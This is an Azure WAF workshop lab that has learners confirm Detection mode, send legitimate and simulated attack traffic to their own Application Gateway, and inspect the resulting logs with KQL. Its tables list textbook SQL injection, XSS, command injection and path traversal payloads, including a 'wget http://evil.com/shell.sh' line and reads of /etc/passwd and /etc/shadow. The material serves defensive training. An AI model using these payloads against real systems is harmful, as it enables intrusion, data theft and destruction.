# Lab 02 – Configure WAF in Detection Mode and Generate Test Traffic

## Overview

In this lab you will confirm the WAF policy is running in **Detection** mode, generate a mix of legitimate and malicious traffic using the provided `generate-traffic.ps1` script, and observe how the WAF logs threats without blocking any requests.

### Objectives

| # | Objective |
|---|-----------|
| 1 | Understand how Detection mode differs from Prevention mode |
| 2 | Generate legitimate traffic to establish a baseline |
| 3 | Generate attack traffic (SQLi, XSS, Command Injection, Path Traversal) |
| 4 | Verify that no requests are blocked in Detection mode |
| 5 | Navigate to diagnostic logs in the portal |
| 6 | Understand log ingestion latency for Log Analytics |

### Prerequisites

- **Lab 01** completed successfully.
- The Application Gateway public IP saved in `$APPGW_PIP`.
- PowerShell 7+ with the `generate-traffic.ps1` script available at `scripts/generate-traffic.ps1`.

### Estimated Duration

**25–35 minutes**

---

## Section 1 – Verify Detection Mode

### 1.1 – Confirm via Portal

1. Open the **Azure portal**: [https://portal.azure.com](https://portal.azure.com).
2. Navigate to **Web Application Firewall policies** (search in the top bar).
3. Click on your WAF policy (e.g., `waf-policy-workshop`).
4. On the **Overview** blade, locate the **Policy mode**.
5. Verify it reads **Detection**.

### 1.2 – Confirm via CLI

```powershell
$RG = "rg-waf-workshop"

$mode = az network application-gateway waf-policy show `
    --resource-group $RG `
    --name "waf-policy-workshop" `
    --query "policySettings.mode" -o tsv

Write-Host "Current WAF mode: $mode"
```

**Expected output:** `Detection`

### 1.3 – Understand Detection vs. Prevention

| Aspect | Detection Mode | Prevention Mode |
|--------|---------------|-----------------|
| **Logging** | ✅ All rule matches are logged | ✅ All rule matches are logged |
| **Blocking** | ❌ No requests are blocked | ✅ Matching requests are blocked (403) |
| **Use case** | Initial deployment, tuning, analysis | Production protection |
| **Risk** | Attacks reach the backend | Legitimate traffic may be blocked (false positives) |

> **Best practice:** Always start in **Detection** mode, analyze the logs, create exclusions for false positives, and only then switch to **Prevention** mode.

---

## Section 2 – Generate Legitimate Traffic

Before generating attack traffic, send normal requests to establish a baseline. This helps distinguish between legitimate and malicious patterns in the logs.

### 2.1 – Browser Requests

1. Open a browser and navigate to `http://<APPGW_PIP>`.
2. Click through several pages if available.
3. Refresh the page 5–10 times.

### 2.2 – PowerShell Requests

```powershell
$APPGW_PIP = "<your-appgw-public-ip>"

# Send 20 legitimate GET requests
1..20 | ForEach-Object {
    $response = Invoke-WebRequest -Uri "http://$APPGW_PIP/" -UseBasicParsing
    Write-Host "Request $_ - Status: $($response.StatusCode)"
    Start-Sleep -Milliseconds 500
}
```

### 2.3 – Legitimate Requests with Common Paths

```powershell
# Test common legitimate URL paths
$legitimatePaths = @("/", "/index.html", "/about", "/contact", "/api/health")

foreach ($path in $legitimatePaths) {
    try {
        $response = Invoke-WebRequest -Uri "http://$APPGW_PIP$path" -UseBasicParsing -ErrorAction Stop
        Write-Host "GET $path - Status: $($response.StatusCode)"
    } catch {
        Write-Host "GET $path - Status: $($_.Exception.Response.StatusCode.Value__)" -ForegroundColor Yellow
    }
    Start-Sleep -Milliseconds 300
}
```

### 2.4 – Legitimate POST Request

```powershell
# Send a legitimate form submission
$body = @{
    name  = "John Doe"
    email = "john.doe@example.com"
    message = "Hello, this is a legitimate form submission."
} | ConvertTo-Json

Invoke-WebRequest -Uri "http://$APPGW_PIP/api/contact" `
    -Method POST `
    -ContentType "application/json" `
    -Body $body `
    -UseBasicParsing -ErrorAction SilentlyContinue
```

---

## Section 3 – Generate Attack Traffic

Now use the provided `generate-traffic.ps1` script to send simulated attack traffic. The WAF will evaluate and log these requests but will **not block** them because it is in Detection mode.

### 3.1 – Review the Script

Before running, examine what the script does:

```powershell
:octicons-download-24: **Script**: [generate-traffic.ps1](https://github.com/lcarli/AzureWAF-Learning/blob/main/scripts/generate-traffic.ps1)

Get-Help .\scripts\generate-traffic.ps1 -Detailed
```

### 3.2 – Generate SQL Injection Traffic

SQL injection attacks attempt to manipulate backend databases by injecting SQL code into request parameters.

```powershell
.\scripts\generate-traffic.ps1 -TargetUrl "http://$APPGW_PIP" -AttackType SQLi
```

**Example SQLi payloads the script sends:**

| Payload | Description |
|---------|-------------|
| `?id=1' OR '1'='1` | Classic boolean-based SQLi |
| `?id=1; DROP TABLE users--` | Destructive SQL command |
| `?id=1 UNION SELECT username, password FROM users` | Data extraction via UNION |
| `?search=admin'--` | Authentication bypass |

### 3.3 – Generate Cross-Site Scripting (XSS) Traffic

XSS attacks inject malicious JavaScript into web pages viewed by other users.

```powershell
.\scripts\generate-traffic.ps1 -TargetUrl "http://$APPGW_PIP" -AttackType XSS
```

**Example XSS payloads:**

| Payload | Description |
|---------|-------------|
| `?q=<script>alert('XSS')</script>` | Reflected XSS |
| `?name=<img src=x onerror=alert(1)>` | Event handler-based XSS |
| `?input=<body onload=alert('XSS')>` | Body onload XSS |

### 3.4 – Generate Command Injection Traffic

Command injection attempts to execute operating system commands on the server.

```powershell
.\scripts\generate-traffic.ps1 -TargetUrl "http://$APPGW_PIP" -AttackType CommandInjection
```

**Example command injection payloads:**

| Payload | Description |
|---------|-------------|
| `?cmd=; ls -la /etc/passwd` | Linux command injection |
| `?input=\| cat /etc/shadow` | Pipe-based command injection |
| `?file=; wget http://evil.com/shell.sh` | Download and execute |

### 3.5 – Generate Path Traversal Traffic

Path traversal attacks attempt to access files outside the web application's root directory.

```powershell
.\scripts\generate-traffic.ps1 -TargetUrl "http://$APPGW_PIP" -AttackType PathTraversal
```

**Example path traversal payloads:**

| Payload | Description |
|---------|-------------|
| `?file=../../../../etc/passwd` | Classic path traversal |
| `?page=....//....//etc/shadow` | Double-encoding evasion |
| `?doc=..%2F..%2F..%2Fetc%2Fpasswd` | URL-encoded traversal |

### 3.6 – Generate All Attack Types

To send all attack types at once:

```powershell
.\scripts\generate-traffic.ps1 -TargetUrl "http://$APPGW_PIP" -AttackType All
```

### 3.7 – Record the Timestamp

Note the time when you finished generating traffic. You will use this to filter logs in the next sections.

```powershell
$trafficTimestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss UTC"
Write-Host "Traffic generation completed at: $trafficTimestamp"
```

---

## Section 4 – Verify No Blocking

In Detection mode, the WAF should **not** block any requests. All responses should return a `200 OK` (or `404` if the path does not exist) — but **never** a `403 Forbidden` from the WAF.

### 4.1 – Manual Verification

Send a known attack payload directly and observe the response:

```powershell
# SQL Injection test
$sqliResponse = Invoke-WebRequest -Uri "http://$APPGW_PIP/?id=1' OR '1'='1" `
    -UseBasicParsing -ErrorAction SilentlyContinue

Write-Host "SQLi test - Status: $($sqliResponse.StatusCode)"
```

**Expected output:** `SQLi test - Status: 200` (or `404`, but **not** `403`)

### 4.2 – XSS Verification

```powershell
# XSS test
$xssResponse = Invoke-WebRequest -Uri "http://$APPGW_PIP/?q=<script>alert('xss')</script>" `
    -UseBasicParsing -ErrorAction SilentlyContinue

Write-Host "XSS test - Status: $($xssResponse.StatusCode)"
```

**Expected output:** Status is **not** `403`.

### 4.3 – Path Traversal Verification

```powershell
# Path Traversal test
$ptResponse = Invoke-WebRequest -Uri "http://$APPGW_PIP/?file=../../../../etc/passwd" `
    -UseBasicParsing -ErrorAction SilentlyContinue

Write-Host "Path Traversal test - Status: $($ptResponse.StatusCode)"
```

### 4.4 – Summary of Expected Behavior

| Attack Type | Detection Mode Response | Prevention Mode Response |
|-------------|------------------------|--------------------------|
| SQL Injection | `200` (passed through) | `403` (blocked) |
| XSS | `200` (passed through) | `403` (blocked) |
| Command Injection | `200` (passed through) | `403` (blocked) |
| Path Traversal | `200` (passed through) | `403` (blocked) |

> **Key takeaway:** In Detection mode, all requests reach the backend. The WAF only logs the matches for analysis purposes.

---

## Section 5 – Check WAF Logs in Portal

### 5.1 – Navigate to Application Gateway Logs

1. Open the **Azure portal**.
2. Navigate to your Application Gateway (`appgw-waf-workshop`).
3. In the left menu, under **Monitoring**, select **Logs**.
4. Close the **Queries** dialog if it appears.

### 5.2 – Run a Quick Firewall Log Query

In the query editor, enter the following KQL query:

```kusto
AzureDiagnostics
| where ResourceType == "APPLICATIONGATEWAYS"
| where Category == "ApplicationGatewayFirewallLog"
| project TimeGenerated, ruleId_s, Message, action_s, hostname_s, requestUri_s, details_message_s
| sort by TimeGenerated desc
| take 20
```

5. Click **Run**.

### 5.3 – Examine Initial Results

If the deployment is new, you may see:

- **Results found:** Logs from your traffic generation appear here. You will see entries with `action_s = "Detected"` (not "Blocked").
- **No results:** Logs may not have been ingested yet. Proceed to Section 6.

### 5.4 – Navigate to Log Analytics Workspace Directly

1. In the Azure portal search bar, type **Log Analytics workspaces**.
2. Select your workspace (e.g., `log-waf-workshop`).
3. In the left menu, select **Logs**.
4. Run the same query as above.

---

## Section 6 – Wait for Log Ingestion

### 6.1 – Understand Log Ingestion Latency

Azure Log Analytics does **not** display logs in real time. There is an inherent ingestion delay:

| Scenario | Typical Delay |
|----------|---------------|
| Normal conditions | **5–10 minutes** |
| High-volume periods | **10–15 minutes** |
| First-time ingestion | **Up to 20 minutes** |

### 6.2 – Verify Logs Are Flowing

Wait 5–10 minutes after generating traffic, then run this query in Log Analytics:

```kusto
AzureDiagnostics
| where ResourceType == "APPLICATIONGATEWAYS"
| where Category == "ApplicationGatewayFirewallLog"
| summarize Count = count() by bin(TimeGenerated, 1m)
| sort by TimeGenerated desc
| take 20
```

You should see a count of log entries grouped by minute, with entries corresponding to your traffic generation time.

### 6.3 – Quick Check for Any Logs

```kusto
AzureDiagnostics
| where ResourceType == "APPLICATIONGATEWAYS"
| summarize Count = count() by Category
```

**Expected output:**

| Category | Count |
|----------|-------|
| ApplicationGatewayAccessLog | _varies_ |
| ApplicationGatewayFirewallLog | _varies_ |
| ApplicationGatewayPerformanceLog | _varies_ |

### 6.4 – While Waiting

While you wait for logs to appear, use this time to:

1. **Review Lab 03** – Familiarize yourself with the KQL queries you will run.
2. **Review the KQL query library** – Examine `../resources/kql-queries.md` for advanced queries.
3. **Generate more traffic** – Run the script again to increase the volume of log data.

```powershell
# Generate additional traffic while waiting
.\scripts\generate-traffic.ps1 -TargetUrl "http://$APPGW_PIP" -AttackType All
```

> **Tip:** Generating traffic in multiple rounds helps ensure you have enough log data for meaningful analysis in Lab 03.

---

## Summary

In this lab you:

- ✅ Confirmed the WAF policy is operating in **Detection** mode
- ✅ Generated legitimate traffic to establish a baseline
- ✅ Generated attack traffic (SQLi, XSS, Command Injection, Path Traversal) using `generate-traffic.ps1`
- ✅ Verified that **no requests were blocked** — all received `200` (or `404`) responses
- ✅ Navigated to diagnostic logs in the portal
- ✅ Understood the log ingestion latency for Log Analytics (5–10 minutes)

### Key Concepts

| Concept | Description |
|---------|-------------|
| **Detection mode** | WAF logs all rule matches but does not block traffic |
| **Prevention mode** | WAF blocks traffic that matches rules (returns 403) |
| **Anomaly scoring** | DRS 2.1 uses anomaly scoring — multiple low-severity matches can accumulate to trigger a block |
| **Log latency** | Log Analytics typically has a 5–10 minute ingestion delay |

### Next Steps

Proceed to **[Lab 03 – Analyze WAF Logs with KQL](lab03.md)** to deep-dive into the WAF logs using Kusto Query Language.
